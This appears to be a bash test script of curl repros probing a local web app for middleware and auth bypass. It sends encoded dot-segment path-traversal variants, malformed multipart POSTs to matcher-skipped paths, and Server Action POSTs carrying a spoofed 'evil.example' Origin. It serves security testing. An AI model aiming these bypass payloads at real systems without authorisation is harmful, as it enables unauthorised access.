#!/bin/bash
# z5 round 2l: minimal repros (curl only, NO cookie, NO login). usage: repro-n2.sh [BASE]   (default http://localhost:3103)
U=${1:-http://localhost:3103}
t() { LABEL=$1; shift; code=$(curl -s -o /tmp/z5-o.txt -w '%{http_code}' --path-as-is "$@"); printf '%-76s HTTP %s  %s\n' "$LABEL" "$code" "$(head -c 40 /tmp/z5-o.txt | tr '\r\n' '  ')"; }
printf -- '--BB\r\nContent-Disposition: form-data; name="a"\r\n\r\nb\r\n--BB--\r\n' > /tmp/z5-valid.mp
echo "# class 1: /_global-error spelled with dot segments / fragment (wrapper compares the raw string)"
for p in '/_global-error' '/./_global-error' '/x/../_global-error' '/%2e/_global-error' '/%2E%2E/_global-error' '/projects/../_global-error' '/_global-error#x' '/_global-error/../_global-error'; do t "GET $p" "$U$p"; t "HEAD $p" -I "$U$p"; done
echo "# class 2: POST with a multipart content type to the paths the proxy matcher skips (/favicon.ico, /_next/image, ...)"
for p in '/favicon.ico' '/_next/image' '/_next/image?url=/' '/_next/imagefoo' '/favicon.ico/x'; do
  t "POST $p CT=multipart/form-data, body x" -X POST -H 'Content-Type: multipart/form-data' --data-binary x "$U$p"
  t "POST $p CT=multipart/form-data;boundary=BB, empty body" -X POST -H 'Content-Type: multipart/form-data; boundary=BB' -H 'Content-Length: 0' "$U$p"
  t "POST $p CT=multipart/form-data;boundary=BB, valid body (control)" -X POST -H 'Content-Type: multipart/form-data; boundary=BB' --data-binary @/tmp/z5-valid.mp "$U$p"
done
echo "# class 3: Server Action POST with a foreign Origin to those paths (framework's own origin check answers 500; no write happens)"
for p in '/favicon.ico/..;/projects' '/favicon.ico?/../projects' '/favicon.ico#/../projects' '/_next/image%2f..%2fprojects' '/_next/image/..%2fprojects'; do
  t "POST $p Next-Action + Origin evil" -X POST -H 'Origin: https://evil.example' -H 'Sec-Fetch-Site: cross-site' -H 'Next-Action: 00' -H 'Content-Type: multipart/form-data; boundary=BB' --data-binary @/tmp/z5-valid.mp "$U$p"; done
echo "# controls"
t "GET /favicon.ico" "$U/favicon.ico"; t "GET /_next/image?url=%2F" "$U/_next/image?url=%2F"; t "GET /healthz" "$U/healthz"; t "GET /projects (unauth)" "$U/projects"
